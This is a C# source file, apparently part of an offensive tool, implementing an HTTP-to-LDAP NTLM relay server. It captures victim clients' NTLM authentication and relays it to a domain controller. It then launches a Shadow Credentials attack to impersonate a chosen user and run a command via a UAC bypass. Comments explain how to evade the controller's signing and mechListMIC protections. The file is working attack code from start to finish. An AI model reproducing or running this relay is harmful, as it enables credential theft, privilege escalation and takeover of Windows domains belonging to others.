using System.Net;
using System.Text;
using HttpLdapRelay.Kerberos;

namespace HttpLdapRelay
{
    /// <summary>
    /// HTTP Relay Server - Proxies NTLM authentication from HTTP to LDAP
    /// Based on Impacket ntlmrelayx approach
    /// 
    /// Le flux de relay NTLM est le suivant:
    /// 1. Client HTTP envoie Type 1 (Negotiate) - peut être wrappé dans SPNEGO
    /// 2. Server extrait le Type 1 NTLM brut et l'envoie au serveur LDAP
    /// 3. LDAP retourne Type 2 (Challenge)
    /// 4. Server envoie Type 2 au client HTTP
    /// 5. Client HTTP répond avec Type 3 (Authenticate)
    /// 6. Server extrait le Type 3 NTLM brut et l'envoie au serveur LDAP
    /// 7. Si succès, l'authentification est réussie
    /// </summary>
    public class HttpRelayServer
    {
        private readonly HttpListener _listener;
        private readonly string _ldapTarget;
        private readonly int _ldapPort;
        private readonly bool _verbose;
        private readonly bool _useLdaps;
        private readonly SessionManager _sessionManager;
        private readonly string _command;  // Command for SCM UAC Bypass
        private readonly string _userToImpseronate;
        private readonly string _fullDomainName;
        private bool _running;
        private readonly bool _forceOverwrite;  // Force overwrite existing msDS-KeyCredentialLink


        // Track accounts that have already been attacked to avoid loops
        private readonly System.Collections.Generic.HashSet<string> _attackedAccounts = new();
        private readonly object _attackedLock = new object();

        public HttpRelayServer(int httpPort, string ldapTarget, int ldapPort, bool useLdaps, bool verbose, string userToImpseronate, string fullDomainName, string listenAddress = "localhost", string command = null, bool forceOverwrite = false)
        {
            _listener = new HttpListener();
            _command = command;
            _userToImpseronate = userToImpseronate;
            _fullDomainName = fullDomainName;
            _forceOverwrite = forceOverwrite;


            string prefix = $"http://{listenAddress}:{httpPort}/";

            _listener.Prefixes.Add(prefix);
            _ldapTarget = ldapTarget;
            _ldapPort = ldapPort;
            _useLdaps = useLdaps;
            _verbose = verbose;
            _sessionManager = new SessionManager();

            _listener.AuthenticationSchemes = AuthenticationSchemes.Anonymous;
        }

        public void Start()
        {
            try
            {
                _listener.Start();
                _running = true;

                Console.WriteLine();
                Console.WriteLine("[*] Waiting for incoming HTTP connections...");
                Console.WriteLine();

                while (_running)
                {
                    try
                    {
                        var context = _listener.GetContext();
                        ThreadPool.QueueUserWorkItem(HandleClient, context);
                    }
                    catch (HttpListenerException ex) when (ex.ErrorCode == 995)
                    {
                        break;
                    }
                    catch (Exception ex)
                    {
                        LogError($"Error accepting connection: {ex.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                LogError($"Failed to start HTTP server: {ex.Message}");
                throw;
            }
        }

        public void Stop()
        {
            _running = false;
            _listener.Stop();
            _listener.Close();
            Console.WriteLine("[*] Server stopped");
        }

        private void HandleClient(object state)
        {
            var context = (HttpListenerContext)state;

            try
            {
                var request = context.Request;
                var response = context.Response;

                string clientIp = request.RemoteEndPoint?.Address.ToString() ?? "unknown";
                LogVerbose($"[*] Connection from {clientIp}");
                LogVerbose($"[*] Request: {request.HttpMethod} {request.Url}");
                LogVerbose($"[*] KeepAlive={request.KeepAlive} ProtocolVersion={request.ProtocolVersion} ContentLength={request.ContentLength64}");
                foreach (string headerName in request.Headers.AllKeys)
                {
                    LogVerbose($"[*]   {headerName}: {request.Headers[headerName]}");
                }

                string authHeader = request.Headers["Authorization"];
                string sessionCookie = request.Cookies["relay-session"]?.Value;

                if (string.IsNullOrEmpty(authHeader))
                {
                    LogVerbose($"[*] No auth header, requesting authentication from {clientIp}");

                    // Only offer "NTLM", not "Negotiate": the client's SSPI only
                    // asks for NTLMSSP_NEGOTIATE_SIGN (and so triggers the DC's
                    // mechListMIC enforcement on the LDAP side, which a relay
                    // can't satisfy) when it goes through a full SPNEGO/Negotiate
                    // handshake. Advertising only the plain "NTLM" scheme here
                    // should force it down the simpler NTLM-only code path from
                    // the start - the same one the historical "accidental"
                    // SPNEGO-downgrade fallback used, which never set SIGN.
                    response.StatusCode = 401;
                    response.AddHeader("WWW-Authenticate", "NTLM");
                    response.ContentLength64 = 0;
                    response.Close();
                    return;
                }

                string[] parts = authHeader.Split(new[] { ' ' }, 2);

                string authType = parts[0];
                byte[] authData;

                try
                {
                    authData = Convert.FromBase64String(parts[1]);
                }
                catch (FormatException)
                {
                    LogError($"[!] Invalid base64 in Authorization header");
                    SendErrorResponse(response, 400, "Invalid Authorization data");
                    return;
                }

                LogVerbose($"[+] Received {authType} token from {clientIp} ({authData.Length} bytes)");

                // Extraire le message NTLM brut (peut être wrappé dans SPNEGO)
                byte[] ntlmMessage = ExtractNtlmMessage(authData);
                if (ntlmMessage == null)
                {
                    LogError("[!] Could not extract NTLM message from auth data");
                    SendErrorResponse(response, 400, "Invalid NTLM data");
                    return;
                }

                int messageType = GetNtlmMessageType(ntlmMessage);

                if (messageType == 1)
                {
                    Handle_NtlmType1(context, ntlmMessage, clientIp, authType);
                }
                else if (messageType == 3)
                {
                    Handle_NtlmType3(context, ntlmMessage, sessionCookie, clientIp, authType);
                }
                else
                {
                    Console.WriteLine($"[!] Unexpected NTLM message type: {messageType}");
                    LogVerbose($"[*] First bytes: {BitConverter.ToString(authData, 0, Math.Min(16, authData.Length))}");
                    SendErrorResponse(response, 400, "Unexpected authentication message");
                }


            }
            catch (Exception ex)
            {
                LogError($"Error handling client: {ex.Message}");
                if (_verbose)
                {
                    LogError($"Stack trace: {ex.StackTrace}");
                }
            }

        }

        private void Handle_NtlmType1(HttpListenerContext context, byte[] ntlmType1, string clientIp, string authType)
        {
            LogVerbose($"[*] Type 1 data ({ntlmType1.Length} bytes): {BitConverter.ToString(ntlmType1, 0, Math.Min(32, ntlmType1.Length))}...");

            // Create a new relay session
            var session = _sessionManager.CreateSession();
            session.TargetServer = _ldapTarget;
            session.TargetPort = _ldapPort;
            session.UseLdaps = _useLdaps;


            // Connect to LDAP using our custom client
            var ldapClient = new LdapRelayClient(_ldapTarget, _ldapPort, _useLdaps);

            try
            {
                ldapClient.Connect();
            }
            catch (Exception ex)
            {
                LogError("[!] Failed to connect to LDAP");
                SendErrorResponse(context.Response, 500, "Failed to connect to LDAP");
                _sessionManager.RemoveSession(session.SessionId);
                Console.WriteLine($"LDAP connect failed: {ex.Message}");
                return;
            }

            session.LdapClient = ldapClient;
            session.State = SessionState.Type1Sent;

            // Send Type 1 to LDAP and get Type 2 challenge
            byte[] type2Data = ldapClient.SendNtlmNegotiate(ntlmType1);

            if (type2Data == null)
            {
                LogError("[!] Failed to get NTLM Type 2 from LDAP");
                SendErrorResponse(context.Response, 500, "LDAP relay failed");
                _sessionManager.RemoveSession(session.SessionId);
                return;
            }

            session.State = SessionState.Type2Received;

            LogVerbose($"[+] Received NTLM Type 2 from LDAP ({type2Data.Length} bytes)");
            LogVerbose($"[*] Type 2 data: {BitConverter.ToString(type2Data, 0, Math.Min(32, type2Data.Length))}...");

            // Send Type 2 back to HTTP client.
            // "Negotiate" is SPNEGO: the raw NTLM challenge must be wrapped in a
            // NegTokenResp, otherwise strict SPNEGO consumers (e.g. the print
            // spooler's IPP client) reject the token and abort instead of
            // falling back to NTLM like WebClient does.
            bool isNegotiate = string.Equals(authType, "Negotiate", StringComparison.OrdinalIgnoreCase);
            byte[] responseToken = isNegotiate ? WrapNtlmTokenInSpnego(type2Data) : type2Data;
            string type2B64 = Convert.ToBase64String(responseToken);

            context.Response.StatusCode = 401;
            context.Response.AddHeader("WWW-Authenticate", $"{authType} {type2B64}");

            var cookie = new Cookie("relay-session", session.SessionId)
            {
                Path = "/",
                HttpOnly = true
            };
            context.Response.Cookies.Add(cookie);

            context.Response.ContentLength64 = 0;
            context.Response.Close();

            LogVerbose($"[+] Sent NTLM Type 2 to client {clientIp}");
        }

        private void Handle_NtlmType3(HttpListenerContext context, byte[] ntlmType3, string sessionCookie, string clientIp, string authType)
        {
            LogVerbose("[*] NTLM Type 3 (Authenticate) received");
            LogVerbose($"[*] Type 3 data ({ntlmType3.Length} bytes): {BitConverter.ToString(ntlmType3, 0, Math.Min(32, ntlmType3.Length))}...");

            if (string.IsNullOrEmpty(sessionCookie))
            {
                LogError("[!] No session cookie - cannot relay Type 3");
                SendErrorResponse(context.Response, 400, "Session lost");
                return;
            }

            var session = _sessionManager.GetSession(sessionCookie);
            if (session == null)
            {
                LogError($"[!] Session not found: {sessionCookie}");
                SendErrorResponse(context.Response, 400, "Session expired");
                return;
            }

            LogVerbose($"[*] Using relay session: {session.SessionId}");

            string identity = ExtractUsernameFromType3(ntlmType3);
            LogVerbose($"[*] Relaying authentication for: {identity}");

            // Send Type 3 to LDAP and inspect the BindResponse
            LdapResult bindResult;
            try
            {
                bindResult = session.LdapClient.SendNtlmAuthenticate(ntlmType3);
            }
            catch (Exception ex)
            {
                LogError($"[!] LDAP bind transport error: {ex.Message}");
                session.State = SessionState.Failed;
                _sessionManager.RemoveSession(session.SessionId);

                SendErrorResponse(context.Response, 401, "Authentication failed");
                Stop();
                return;
            }

            if (bindResult == null || bindResult.ResultCode != 0)
            {
                Console.WriteLine();
                string diagnostic = LdapRelayClient.DiagnoseRelayFailure(
                    bindResult ?? new LdapResult { ResultCode = -1, DiagnosticMessage = "no bind response" },
                    _useLdaps);

                if (!string.IsNullOrEmpty(diagnostic))
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine(diagnostic);
                    Console.ResetColor();
                }

                session.State = SessionState.Failed;
                _sessionManager.RemoveSession(session.SessionId);

                SendErrorResponse(context.Response, 401, "Authentication failed");
                Stop();
                return;
            }
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("[+] ═══════════════════════════════════════════════════════");
            Console.WriteLine("[+]          LDAP AUTHENTICATION SUCCESSFUL!              ");
            Console.WriteLine("[+] ═══════════════════════════════════════════════════════");
            Console.ResetColor();
            Console.WriteLine($"[+] Authenticated as: {identity}");
            Console.WriteLine("[*] LDAP session established");
            Console.WriteLine();

            session.State = SessionState.Authenticated;
            session.ClientIdentity = identity;

            // Extract sAMAccountName and domain from identity (format: DOMAIN\username)
            string samAccountName = identity;
            string domainName = "";
            if (identity.Contains("\\"))
            {
                var parts = identity.Split('\\');
                domainName = parts[0];
                samAccountName = parts[1];
            }

            // Execute Shadow Credentials attack
            bool attackSuccess = session.LdapClient.ExecuteShadowCredentialsAttack(
                samAccountName,
                _fullDomainName,
                _ldapTarget,
                _userToImpseronate,  // User to impersonate
                _command,          // Command for SCM UAC Bypass
                _forceOverwrite
            );

            SendSuccessResponse(context.Response);
            this.Stop();
            // Stop the server after successful attack to prevent retries
            if (attackSuccess)
            {
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[+] Attack completed successfully. Stopping server...");
                Console.ResetColor();

                // Stop the server after a short delay
                System.Threading.Tasks.Task.Run(async () =>
                {
                    await System.Threading.Tasks.Task.Delay(1000);
                    Stop();
                });
            }
        }

        /// <summary>
        /// Extrait le message NTLM brut d'un token qui peut être wrappé dans SPNEGO.
        ///
        /// Un client qui termine une négociation SPNEGO complète (par opposition au
        /// repli en "NTLM" nu) ajoute un champ [3] mechListMIC (protection anti-
        /// downgrade RFC 4178) juste après le [2] responseToken dans son NegTokenResp
        /// final. Chercher "NTLMSSP\0" puis copier jusqu'à la fin du buffer ignore
        /// cette structure et embarque ces octets supplémentaires dans le message
        /// NTLM relayé, le corrompant (taille > réelle) - ce qui fait échouer
        /// AcceptSecurityContext côté LDAP (data 57) sans rapport avec un MIC NTLM
        /// ou une exigence de signature. On décode donc l'ASN.1 pour isoler
        /// exactement le contenu de l'OCTET STRING portant la signature NTLMSSP.
        /// </summary>
        private byte[] ExtractNtlmMessage(byte[] data)
        {
            // Vérifier si c'est du NTLM brut (commence par "NTLMSSP\0")
            if (data.Length >= 8 && Encoding.ASCII.GetString(data, 0, 7) == "NTLMSSP")
            {
                return data;
            }

            // Si wrappé dans SPNEGO, décoder l'ASN.1 pour isoler précisément
            // l'OCTET STRING contenant le message NTLM (pas ce qui le suit).
            if (data.Length > 0 && (data[0] == 0x60 || data[0] == 0xA1 || data[0] == 0xA0))
            {
                try
                {
                    AsnElt root = AsnElt.Decode(data);
                    byte[] ntlmFromAsn = FindNtlmOctetString(root);
                    if (ntlmFromAsn != null)
                    {
                        return ntlmFromAsn;
                    }
                }
                catch
                {
                    // Structure ASN.1 inattendue: on retombe sur l'heuristique ci-dessous.
                }

                for (int i = 0; i < data.Length - 8; i++)
                {
                    if (data[i] == 'N' && data[i + 1] == 'T' && data[i + 2] == 'L' && data[i + 3] == 'M' &&
                        data[i + 4] == 'S' && data[i + 5] == 'S' && data[i + 6] == 'P' && data[i + 7] == 0x00)
                    {
                        // Copier à partir de NTLMSSP jusqu'à la fin
                        byte[] ntlm = new byte[data.Length - i];
                        Array.Copy(data, i, ntlm, 0, ntlm.Length);
                        return ntlm;
                    }
                }
            }

            Console.WriteLine($"[!] Could not find NTLMSSP signature in data");
            LogVerbose($"[*] Data: {BitConverter.ToString(data, 0, Math.Min(32, data.Length))}");

            return null;
        }

        /// <summary>
        /// Recherche en profondeur, dans un arbre ASN.1 décodé, le premier OCTET
        /// STRING primitif dont le contenu commence par la signature NTLMSSP, et
        /// retourne exactement son contenu (ni plus, ni moins) - sans embarquer de
        /// champ frère (ex: [3] mechListMIC) qui le suivrait dans la structure.
        /// </summary>
        private byte[] FindNtlmOctetString(AsnElt node)
        {
            if (!node.Constructed && node.ObjectData != null && node.ObjectData.Length >= 8 &&
                Encoding.ASCII.GetString(node.ObjectData, 0, 7) == "NTLMSSP")
            {
                return node.ObjectData;
            }

            if (node.Sub != null)
            {
                foreach (AsnElt child in node.Sub)
                {
                    byte[] found = FindNtlmOctetString(child);
                    if (found != null)
                    {
                        return found;
                    }
                }
            }

            return null;
        }

        /// <summary>
        /// Wraps a raw NTLM token in a SPNEGO NegTokenResp (RFC 4178) so that
        /// strict GSS-API/SPNEGO consumers accept it as a valid "Negotiate"
        /// continuation instead of a bare, unframed NTLMSSP blob.
        ///
        /// NegotiationToken ::= CHOICE { negTokenResp [1] NegTokenResp }
        /// NegTokenResp ::= SEQUENCE {
        ///     negState      [0] ENUMERATED { accept-incomplete(1) },
        ///     supportedMech [1] MechType (1.3.6.1.4.1.311.2.2.10 = NTLMSSP),
        ///     responseToken [2] OCTET STRING
        /// }
        /// </summary>
        private byte[] WrapNtlmTokenInSpnego(byte[] ntlmToken)
        {
            AsnElt negState = new AsnElt
            {
                TagClass = AsnElt.UNIVERSAL,
                TagValue = 10, // ENUMERATED
                Constructed = false,
                ObjectData = new byte[] { 0x01 } // accept-incomplete
            };

            AsnElt negTokenResp = AsnElt.MakeSequence(
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 0, negState),
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 1, AsnElt.MakeOID("1.3.6.1.4.1.311.2.2.10")),
                AsnElt.MakeExplicit(AsnElt.CONTEXT, 2, AsnElt.MakeOctetString(ntlmToken))
            );

            AsnElt negotiationToken = AsnElt.MakeExplicit(AsnElt.CONTEXT, 1, negTokenResp);
            return negotiationToken.Encode();
        }

        private int GetNtlmMessageType(byte[] data)
        {
            try
            {
                if (data.Length >= 12 && Encoding.ASCII.GetString(data, 0, 7) == "NTLMSSP")
                {
                    return BitConverter.ToInt32(data, 8);
                }
                return 0;
            }
            catch
            {
                return 0;
            }
        }

        private string ExtractUsernameFromType3(byte[] type3Data)
        {
            try
            {
                if (type3Data.Length < 64)
                    return "Unknown";

                // NTLM Type 3 structure
                // Offset 28: DomainNameLen (2) + DomainNameMaxLen (2) + DomainNameOffset (4)
                // Offset 36: UserNameLen (2) + UserNameMaxLen (2) + UserNameOffset (4)

                int domainLen = BitConverter.ToUInt16(type3Data, 28);
                int domainOffset = BitConverter.ToInt32(type3Data, 32);

                int usernameLen = BitConverter.ToUInt16(type3Data, 36);
                int usernameOffset = BitConverter.ToInt32(type3Data, 40);

                string domain = "";
                string username = "";

                if (domainOffset > 0 && domainLen > 0 && domainOffset + domainLen <= type3Data.Length)
                {
                    domain = Encoding.Unicode.GetString(type3Data, domainOffset, domainLen);
                }

                if (usernameOffset > 0 && usernameLen > 0 && usernameOffset + usernameLen <= type3Data.Length)
                {
                    username = Encoding.Unicode.GetString(type3Data, usernameOffset, usernameLen);
                }

                if (!string.IsNullOrEmpty(domain) && !string.IsNullOrEmpty(username))
                {
                    return $"{domain}\\{username}";
                }
                else if (!string.IsNullOrEmpty(username))
                {
                    return username;
                }

                return "Unknown";
            }
            catch (Exception ex)
            {
                LogVerbose($"[*] Error extracting username: {ex.Message}");
                return "Unknown";
            }
        }

        private void SendSuccessResponse(HttpListenerResponse response)
        {
            try
            {
                response.StatusCode = 200;
                response.ContentType = "text/html";

                string html = @"<!DOCTYPE html>
<html>
<head><title>Authentication Successful</title></head>
<body>
<h1>&#x2713; Authentication Successful</h1>
<p>Your credentials have been relayed and authenticated.</p>
</body>
</html>";

                byte[] buffer = Encoding.UTF8.GetBytes(html);
                response.ContentLength64 = buffer.Length;
                response.OutputStream.Write(buffer, 0, buffer.Length);
                response.Close();
            }
            catch (Exception ex)
            {
                LogVerbose($"Error sending success response: {ex.Message}");
            }
        }

        private void SendErrorResponse(HttpListenerResponse response, int statusCode, string message)
        {
            try
            {
                response.StatusCode = statusCode;
                response.ContentType = "text/plain";

                byte[] buffer = Encoding.UTF8.GetBytes(message);
                response.ContentLength64 = buffer.Length;
                response.OutputStream.Write(buffer, 0, buffer.Length);
                response.Close();
            }
            catch (Exception ex)
            {
                LogVerbose($"Error sending error response: {ex.Message}");
            }
        }

        private void LogVerbose(string message)
        {
            if (_verbose)
            {
                Console.WriteLine(message);
            }
        }

        private void LogError(string message)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(message);
            Console.ResetColor();
        }
    }
}